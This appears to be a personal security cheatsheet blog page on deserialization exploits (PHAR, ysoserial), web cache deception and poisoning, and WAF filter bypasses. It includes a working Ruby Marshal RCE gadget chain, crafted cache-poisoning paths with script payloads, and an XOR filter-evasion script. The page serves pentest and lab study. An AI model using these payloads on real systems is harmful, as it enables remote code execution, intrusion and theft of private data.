<p>Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs.</p>
<p>Some languages have magic methods that are invoked automatically <strong>during</strong> the deserialization process. For example, PHP's <code>unserialize()</code> method looks for and invokes an object's <code>__wakeup()</code> magic method.
Java deserialization, the same applies to the <code>ObjectInputStream.readObject()</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">PHP Magic Methods</a></li>
<li><a href="https://dev.to/njnareshjoshi/java-serialization-magic-methods-and-their-uses-with-example-4beo">Java Magic Methods</a></li>
<li><a href="https://medium.com/@ayeshasidhikha188/a-journey-through-pythons-magic-methods-a35c79b856c7">Python Magic Methods</a></li>
</ul>
<h3 id="phar">PHAR</h3>
<p>When dealing with user input passed to function such as <code>include()</code> , <code>fopen()</code>or <code>file_exists()</code>, <strong>if an arbitrary file upload</strong> is possible, an attacker can upload an evil <code>PHAR</code> archive to the server and abuse the implicit metadata deserialization by using the<code>phar://</code> stream.</p>
<p>Useful resources:</p>
<ul>
<li><a href="https://github.com/kunte0/phar-jpg-polyglot">PHAR-JPEG Polyglot</a></li>
<li><a href="https://github.com/ambionics/phpggc">PHPGCC</a></li>
</ul>
<h3 id="ysoserial">ysoserial</h3>
<p>From Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial:</p>
<div class="highlight"><pre><span></span><code>java<span class="w"> </span>--add-opens<span class="o">=</span>java.xml/com.sun.org.apache.xalan.internal.xsltc.trax<span class="o">=</span>ALL-UNNAMED<span class="w"> </span>--add-opens<span class="o">=</span>java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime<span class="o">=</span>ALL-UNNAMED<span class="w">  </span>--add-opens<span class="o">=</span>java.base/java.net<span class="o">=</span>ALL-UNNAMED<span class="w"> </span>--add-opens<span class="o">=</span>java.base/java.util<span class="o">=</span>ALL-UNNAMED<span class="w"> </span>-jar<span class="w"> </span>ysoserial-all.jar<span class="w"> </span><span class="o">[</span>payload<span class="o">]</span><span class="w"> </span><span class="s1">'[command]'</span>
</code></pre></div>
<p>The <code>URLDNS</code> chain triggers a DNS lookup for a supplied URL:</p>
<ul>
<li>It does not rely on the target application using a specific vulnerable library and works in <strong>any known Java version.</strong></li>
</ul>
<p><code>JRMPClient</code> is another universal chain that you can use for initial detection:</p>
<ul>
<li>It causes the server to try establishing a TCP connection to the supplied IP address. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups.</li>
</ul>
<h3 id="ruby">Ruby</h3>
<p>Universal RCE Gadget for  Ruby &lt;= 3.0.2:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Autoload the required classes</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
<span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>

<span class="nb">require</span><span class="w"> </span><span class="s1">'base64'</span>
<span class="c1"># prevent the payload from running when we Marshal.dump it</span>
<span class="k">module</span><span class="w"> </span><span class="nn">Gem</span>
<span class="w">  </span><span class="k">class</span><span class="w"> </span><span class="nc">Requirement</span>
<span class="w">    </span><span class="k">def</span><span class="w"> </span><span class="nf">marshal_dump</span>
<span class="w">      </span><span class="o">[</span><span class="vi">@requirements</span><span class="o">]</span>
<span class="w">    </span><span class="k">end</span>
<span class="w">  </span><span class="k">end</span>
<span class="k">end</span>

<span class="n">wa1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">Kernel</span><span class="p">,</span><span class="w"> </span><span class="ss">:system</span><span class="p">)</span>

<span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">rs</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@sets'</span><span class="p">,</span><span class="w"> </span><span class="n">wa1</span><span class="p">)</span>
<span class="n">rs</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@git_set'</span><span class="p">,</span><span class="w"> </span><span class="s2">"rm /home/carlos/morale.txt"</span><span class="p">)</span>

<span class="n">wa2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span><span class="w"> </span><span class="ss">:resolve</span><span class="p">)</span>

<span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">i</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@read'</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="n">i</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@header'</span><span class="p">,</span><span class="w"> </span><span class="s2">"aaa"</span><span class="p">)</span>


<span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">n</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">)</span>
<span class="n">n</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@debug_output'</span><span class="p">,</span><span class="w"> </span><span class="n">wa2</span><span class="p">)</span>

<span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">t</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@io'</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">)</span>

<span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">r</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s1">'@requirements'</span><span class="p">,</span><span class="w"> </span><span class="n">t</span><span class="p">)</span>

<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="o">[</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span><span class="p">,</span><span class="w"> </span><span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="o">]</span><span class="p">)</span>
<span class="nb">puts</span><span class="w"> </span><span class="no">Base64</span><span class="o">.</span><span class="n">encode64</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<h2 id="web-cache_1">Web Cache</h2>
<p><strong>Non-cacheable</strong> requests are identifiable by the following headers:</p>
<ul>
<li><code>Cache-Control: no-store</code></li>
<li><code>Cache-Control: private</code> </li>
<li><code>X-Cache: dynamic</code></li>
</ul>
<p><strong>Cached</strong> responses are identifiable by the following header: <code>X-Cache: hit</code> or <code>X-Cache-Lookup: hit</code></p>
<p>It's important to distinguish <strong>web cache deception</strong> from <strong>web cache poisoning</strong>. While both exploit caching mechanisms, they do so in different ways:</p>
<ul>
<li><strong>Web cache poisoning</strong> manipulates cache keys to inject malicious content into a cached response, which is then served to other users.</li>
<li><strong>Web cache deception</strong> exploits cache rules to trick the cache into storing sensitive or private content, which the attacker can then access.</li>
</ul>
<p>In theory, sites can use the <code>Vary</code> response header to specify additional request headers that should be <strong>keyed</strong> when caching a page. in practice, the <code>Vary</code> header is only used in a rudimentary way, CDNs like Cloudflare ignore it outright.</p>
<h3 id="web-cache-deception">Web Cache Deception</h3>
<p>In a <strong>web cache deception</strong> attack, an attacker persuades a victim to visit a malicious URL, inducing the victim's browser to make an ambiguous request for sensitive content. The cache misinterprets this as a request for a static resource and stores the response. The attacker can then request the same URL to access the cached response, gaining unauthorized access to private information.</p>
<ul>
<li>This attack aims to abuse discrepancies in URL parsing between the application server and the cache server.</li>
<li>Note that <strong>cache servers often don't use delimiters aside from the question mark</strong> whilst application server can use different delimiters depending on the framework used.</li>
<li>Many HTTP servers and proxies including Nginx, Node, CloudFlare, CloudFront and Google Cloud decode certain delimiter characters before interpreting the pathname. This process is generally inconsistent between all of them. Moreover, many proxies decode the URL and forward the message with the decoded values.</li>
</ul>
<p>Steps to perform before executing the Web Cache Deception attack:</p>
<ol>
<li><strong>Detect origin delimiters</strong>: Try fuzzing delimiters used by the application to parse the URL on <strong>a non-cacheable request</strong>. Es: Springboot uses <code>;</code> as delimiter so that <code>/MyAccount;var1=va</code> URL is parsed as <code>/MyAccount</code> path. Take a look to the referenced article below. <strong>Try URL-encoded and not encoded chars!</strong></li>
<li><strong>Detect cache delimiters</strong>: Test if a char is the cache delimiter by requesting a R0 request and then appending a random value to the delimiter in a R1 request (<code>GET /static-endpoint&lt;DELIMITER&gt;&lt;Random&gt;</code>); if responses are equal, the char is the delimiter.</li>
<li><strong>Detect if any decoding</strong>: To test if a character is being decoded, compare a base request with its encoded version in two requests. Es: <code>/home/index</code>&rarr; <code>/%68%6f%6d%65%2f%69%6e%64%65%78</code>. <ul>
<li>If a non-cacheable requests returns the same response in both requests, the origin server decodes the path before using it.</li>
<li>If a cacheable request contains the same cache headers in the response in both requests, it means that the second one was obtained from the proxy, and the key was decoded before being compared.</li>
</ul>
</li>
<li><strong>Detect if any dot-segment normalization</strong>: <ul>
<li>To detect normalization in the <strong>origin server</strong>, issue a non-cacheable request (or a request with a <strong>cache buster</strong>) to a known path, then send the same message with a path traversal sequence. If the responses are identical, this means that the path is normalized before it's mapped with a resource.</li>
<li>To detect normalization at the <strong>web cache</strong>, repeat the same process but with a cacheable response and compare the X-Cache and Cache-Control headers to verify if the resource was obtained from the cache memory.</li>
</ul>
</li>
</ol>
<p>It's possible to make the cache server cache private responses by taking advantage of its caching rules:</p>
<ul>
<li>
<p>Most CDN providers, such as CloudFlare and Akamai, store responses for resources with <strong>static extensions</strong> such as <code>.js</code> or .<code>css</code>.</p>
<ul>
<li><strong>Exploit</strong>: Use a character that is used as a delimiter by the origin server but not the cache server to append a static extension to the request. Es: <code>/myaccount$static.css</code> where <code>$</code> is a delimiter for the origin server but not for the cache and <code>.css</code> is treated as static extension by the cache server rules.</li>
</ul>
</li>
<li>
<p>A popular rule implemented in all CDNs allows the user to create rules that match a custom URL path prefix, generally useful for <strong>static directories</strong>:</p>
<ul>
<li><strong>Exploit 1</strong>: Use a character that is used as a delimiter by the origin server but not the cache server and a path traversal sequence, <strong>if normalized by the cache server</strong>, to make the cache server resolve the path as starting from a static directory (<code>GET /&lt;Dynamic_Resource&gt;&lt;Delimiter&gt;&lt;URL Encoded_Dot_Segment&gt;&lt;Static_Directory&gt;</code>). Es: <code>myaccount$..%2Fstatic/any</code> </li>
<li><strong>Exploit 2</strong>: When <strong>the origin server normalizes the path before mapping the endpoint and the cache doesn't normalize the path before evaluating the cache rules</strong>, use this schema instead: <code>GET /&lt;Static_Directory&gt;&lt;Encoded_Dot_Segment&gt;&lt;Dynamic_Resource&gt;</code>. Es: <code>static/..%2Fmyaccount</code></li>
</ul>
</li>
<li>
<p>Some files, like <code>/robots.txt</code>, <code>/favicon.ico</code>, and <code>/index.html</code>, might not be in a static directory or have a static extension but are expected to be immutable in every website (<strong>static files</strong>).</p>
<ul>
<li><strong>Exploit</strong>: use the same technique as for static directories when there is normalization at the frontend and a delimiter at backend, appending the static file name at the end of the URL (<code>GET /&lt;Dynamic_Resource&gt;&lt;Delimiter&gt;&lt;Encoded_Dot_Segment&gt;&lt;Static_File&gt;</code>).</li>
</ul>
</li>
</ul>
<p>References:</p>
<ul>
<li><a href="https://portswigger.net/research/gotta-cache-em-all">Portswigger - Gotta Cache-em All</a></li>
<li><a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">Portswigger - Potential Delimiters</a></li>
</ul>
<h3 id="web-cache-poisoning">Web Cache Poisoning</h3>
<p>Basic methodology:</p>
<ol>
<li><strong>Identify unkeyed inputs</strong></li>
<li><strong>Explore input potential</strong></li>
<li><strong>Inject into cache</strong></li>
</ol>
<p>When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp.</p>
<h4 id="cache-key-flaws">Cache key flaws</h4>
<p>Websites generally take most of their input from the URL path and the query string; these inputs have traditionally not been considered suitable for cache poisoning since they're not cached (they would act as <strong>cache busters</strong>). However, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include:</p>
<ul>
<li>Excluding the query string</li>
<li>Filtering out specific query parameters</li>
<li>Normalizing input in keyed components</li>
</ul>
<p>These transformation could lead to <strong>discrepancies between the data that is written to the cache key and the data that is passed into the application code</strong>, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.</p>
<p>The methodology involves the following steps:</p>
<ol>
<li>Identify a suitable <strong>cache oracle</strong></li>
<li>Probe key handling</li>
<li>Identify an exploitable gadget</li>
</ol>
<p><strong>Cache oracle</strong>: an endpoint that must be cacheable, and that must be some way to tell if you got a cache hit or miss. This could be an explicit HTTP header like <code>CF-Cache-Status: HIT</code>, or could be inferred through dynamic content or response timing.</p>
<p>If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. This may contain information about how the default cache key is constructed. </p>
<p>You might even stumble across some handy tips and tricks, such as features that allow you to see the cache key directly.
- For example, Akamai-based websites may support the header <code>Pragma: akamai-x-get-cache-key</code>, which you can use to display the cache key in the response headers</p>
<p><strong>Probe Key Handling</strong>: try <em>removing specific query parameters</em>, <em>removing the entire query string</em>, <em>removing the port from the Host header</em>, and <em>URL-decoding</em>. Issue two slightly different requests and observing whether the second one causes a cache hit, indicating that it was issued with the same cache key as the first. If the cache oracle reflects the entire URL and at least one query parameter it's easier to identify key's discrepancies.</p>
<p>When the page does not clearly indicates a cache hit:
- Put cache busters in any headers that can be safely edited without significant side-effects, and might be included in the cache key. (<code>Add static cachebuster</code> and <code>Include cachebusters in headers</code> options for Param Miner)
- On some targets, you'll find that you can directly delete entries from the target's cache, without authentication, by using the HTTP methods <code>PURGE</code> and <code>FASTLYPURGE</code>. After issuing the first request containing the transformation to be tested and check if its cached by trying to remove it from the cache (ES: 200 OK when removed (i.e was cached), 404 Not Found when not existing (i.e was not cached)).
- It's very rare for caches to exclude the path from the cache key and, depending on the back-end system, we can take advantage of path normalization to issue requests with different keys that still hit the same endpoint. Here's four different approaches to hitting the path '/' on different systems: <code>Apache: //</code> , <code>Nginx: /%2F</code>, <code>PHP: /index.php/xyz</code> , <code>.NET: /(A(xyz))/</code></p>
<p>Cache key flaws attacks:</p>
<ul>
<li><strong>Unkeyed parameters</strong>: harmful parameters that are excluded from the cache key can be used as vector to cache responses containing harmful payloads.</li>
<li><strong>Parameter Cloaking</strong>: when there are discrepancies between the application's parsing and the cache's parsing, this can potentially allow to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter. <ul>
<li><strong>Exploit 1</strong>:  given the following request <code>GET /?example=123?excluded_param=&lt;payload&gt;</code>, the cache server parses (wrongly) two parameters (because of the two <code>?</code>) and excludes the second one BUT the application parses only one parameter (the one after the first <code>?</code>) and considers the rest as part of the value of this parameter. In the example, if parameter <code>example</code> is vulnerable,  the payload will be injected and potentially executed in the cached response.</li>
<li><strong>Exploit 2</strong>:  give the following request <code>GET /?keyed_param=abc&amp;excluded_param=123;keyed_param=payload</code>, the cache server (correctly) parses two parameters and excludes the second one BUT the application might (eg: if using Ruby on Rails) use bot  <code>&amp;</code> and <code>;</code>  as parameter separators and consider only the last occurrence of the repeated parameter.</li>
</ul>
</li>
<li><strong>Fat GET</strong>: when the cache key is based on the URL, but the server accepts <code>GET</code> requests with a body and the value of a parameter is taken from the body instead that from the URL. If the server refuses <code>GET</code> requests with a body, it's worth trying override the HTTP method to <code>POST</code> with the <code>X-HTTP-Method-Override</code> header.<ul>
<li><strong>Key Normalization</strong>: see <a href="http://localhost:1337/web/cheatsheet.html#key-normalization">Key Normalization</a>. Modern browsers typically URL-encode parameters when sending the request, i.e reflected XSS in query params is typically unexploitable if the server does not URL-decode it. But, if the cache server normalizes the encoded chars when keying a request, an attacker could poison the parameter using the Burp Repeater (no encoding) since, for example, <code>GET /example?param="&gt;&lt;test&gt;</code> and <code>GET /example?param=%22%3e%3ctest%3e</code> will have the same key.</li>
</ul>
</li>
<li><strong>Cache Key Injection</strong>: if a user controlled input is used as part of the cache key without proper escaping of the delimiters between the components that form the key, it could be possible for an attacker to craft two different request with the same key, making exploitable client-side vulnerabilities that would otherwise be unexploitable. Firstly try deducting what chars are used as delimiters, then check if there's any escaping for these chars.</li>
<li><strong>Internal Cache Poisoning</strong>:some websites implement caching behaviour directly into the application; Instead of caching entire responses, some of these caches break the response down into reusable fragments and cache them each separately. As these cached fragments are intended to be reusable across multiple distinct responses, the concept of a cache key doesn't really apply. Every response that contains a given fragment will reuse the same cached fragment, even if the rest of the response is completely different. Generally, these kind of caches are manipulable with basic web cache poisoning techniques such as manipulating the <code>Host</code> header.<ul>
<li>if the response reflects a mixture of both input from the last request you sent and input from a previous request, this is a key indicator that the cache is storing fragments rather than entire responses.</li>
<li>if your input is reflected in responses on multiple distinct pages, in particular on pages in which you never tried to inject your input. </li>
</ul>
</li>
</ul>
<h4 id="key-normalization">Key normalization</h4>
<p>Resolving <em>dot-segments</em> and <em>encodings</em> in a cache key could allow an attacker to poison arbitrary resources if the origin server is not interpreting the path in the same way.</p>
<ul>
<li><strong>Exploit 1</strong>: The cache key is normalized by the cache server but not by the origin server: <code>GET /&lt;Backend_Path&gt;&lt;Path_Traversal&gt;&lt;Poisoned_Path&gt;</code> (Es: <code>/&lt;script&gt;X&lt;/script&gt;/../../home</code> is normalized to <code>/home</code> by the cache server but interpreted as <code>/&lt;script&gt;X&lt;/script&gt;/</code> by the origin)</li>
<li><strong>Exploit 2</strong>: A character is used as a delimiter by the origin server but not by the cache: <code>GET /&lt;Backend_Path&gt;&lt;Delimiter&gt;&lt;Path_Traversal&gt;&lt;Poisoned_Path&gt;</code> (Es: <code>/payload$/../home</code> is normalized as <code>/home</code> by the cache server but interpreted as <code>/payload</code> by the origin )</li>
<li>Exploit 3: A character is used as a delimiter by the cache server but not by the origin, ONLY WHEN the key is normalized and the path is forwarded with the suffix after the delimiter: <code>GET /&lt;Poisoned_Path&gt;&lt;Front-End_Delimiter&gt;&lt;Path_Traversal&gt;&lt;Backend_Path&gt;</code> (Es: <code>/home#/../payload</code>)</li>
</ul>
<p><img alt="cache-server-hashtag-delimiter.png" src="http://localhost:1337/images/web/web-cheatsheet/cache-server-hashtag-delimiter.png"/></p>
<p>References:</p>
<ul>
<li><a href="https://portswigger.net/research/practical-web-cache-poisoning">Practical Web Cache Poisoning</a></li>
<li><a href="https://portswigger.net/research/web-cache-entanglement">Web Cache Entanglement</a></li>
</ul>
<h2 id="waf-filters-bypasses_2">WAF Filters Bypasses</h2>
<p>Bypass WAF filters using XOR operations: <a href="https://github.com/devploit/XORpass?tab=readme-ov-file">XORPass</a>.</p>
<p>Take a look at <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings">Obfuscating attacks using encodings</a>.</p>
<p>Bypass path-based WAF restriction appending non-printable and extended-ASCII characters that will be ignored by the server:</p>
<div class="highlight"><pre><span></span><code>\x09 # Spring
\xA0 # Express
\x1C-1F # Flask
</code></pre></div>
<h2 id="generic-bypasses_1">Generic Bypasses</h2>
<p>Use XORing to bypass filters; following a useful script:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span><span class="p">,</span> <span class="n">ascii_letters</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">shellquote</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">"'"</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">,"</span>\\<span class="s2">").replace("</span>\<span class="s2">""</span><span class="p">,</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"").replace("</span><span class="s1">'", "</span><span class="se">\'</span><span class="s1">") + "'</span><span class="s2">"</span>

<span class="n">input_string</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="nb">print</span><span class="p">(</span><span class="s2">"No input provided"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">banned</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="s2">""</span>
<span class="n">separator</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="s2">"+"</span>

<span class="n">charset</span> <span class="o">=</span> <span class="n">printable</span><span class="p">[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
<span class="n">banned</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">banned</span><span class="p">)</span>
<span class="n">alphabet</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">ascii_letters</span><span class="p">:</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">banned</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">letter</span><span class="p">):</span>
        <span class="n">alphabet</span><span class="p">[</span><span class="n">letter</span><span class="p">]</span> <span class="o">=</span> <span class="n">letter</span>
        <span class="k">continue</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">banned</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
            <span class="k">continue</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">banned</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">j</span><span class="p">):</span>
                <span class="k">continue</span>
            <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span> <span class="o">==</span> <span class="n">letter</span><span class="p">):</span>
                <span class="n">alphabet</span><span class="p">[</span><span class="n">letter</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
            <span class="k">break</span>

<span class="n">output_string</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">input_string</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">alphabet</span><span class="p">[</span><span class="n">c</span><span class="p">])</span> <span class="ow">is</span> <span class="nb">tuple</span><span class="p">:</span>
        <span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">c</span><span class="p">]</span>
        <span class="n">output_string</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">"(</span><span class="si">{</span><span class="n">shellquote</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span><span class="si">}</span><span class="s2"> ^ </span><span class="si">{</span><span class="n">shellquote</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span><span class="si">}</span><span class="s2">)"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">output_string</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">"(</span><span class="si">{</span><span class="n">shellquote</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">}</span><span class="s2">)"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">separator</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">output_string</span><span class="p">))</span>
</code></pre></div>
<h2 id="automatic-testing">Automatic Testing</h2>
<p>Generic <code>nuclei</code> scan command:</p>
<div class="highlight"><pre><span></span><code>nuclei<span class="w"> </span>-c<span class="w"> </span>&lt;number<span class="w"> </span>of<span class="w"> </span>concurrent<span class="w"> </span>templates&gt;<span class="w"> </span>-rl<span class="w"> </span>&lt;rate<span class="w"> </span>limit/concurrent<span class="w"> </span>request&gt;<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Cookie:  &lt;cookie&gt;'</span><span class="w"> </span>-u<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-o<span class="w"> </span>nuclei-result.txt<span class="w"> </span>-sresp
</code></pre></div>
<ul>
<li><code>-c</code> : set the max number of concurrent templates to run.</li>
<li><code>-rl</code>: set the max number of concurrent HTTP requests.</li>
<li><code>-sresp</code>: save all requests and responses in the output file (<code>-o</code>)</li>
</ul>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>